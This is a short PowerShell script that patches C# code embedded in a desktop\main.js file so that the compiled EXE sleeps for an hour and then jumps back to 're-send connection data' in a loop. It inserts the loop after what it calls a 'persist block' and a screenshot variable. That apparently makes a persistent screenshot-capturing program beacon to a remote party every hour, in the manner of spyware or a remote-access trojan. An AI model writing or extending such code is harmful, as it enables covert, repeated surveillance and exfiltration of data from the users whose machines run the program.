# Add hourly update loop to the EXE
$mainJs = "desktop\main.js"
$content = Get-Content $mainJs -Raw

# Find the Environment.Exit(0) line at the end of the C# Main method and wrap everything in a loop
$oldExit = 'Environment.Exit(0);
    }
}'

$newExit = @'
        // -- Hourly update loop --
        // Sleep for 1 hour then re-send connection data
        try {
            System.Threading.Thread.Sleep(3600000); // 3600000ms = 1 hour
            goto UpdateLoop; // Jump back to re-send data
        } catch {}
        
        Environment.Exit(0);
    }
}
'@

$content = $content.Replace($oldExit, $newExit)

# Add UpdateLoop label after persist block and variable declarations
$content = $content -replace '(string screenshotB64 = "";)', @'
$1
        UpdateLoop: // Label for hourly update loop
'@

# Save
Set-Content $mainJs -Value $content -Encoding UTF8 -NoNewline
Write-Host "Added hourly update loop to EXE" -ForegroundColor Green
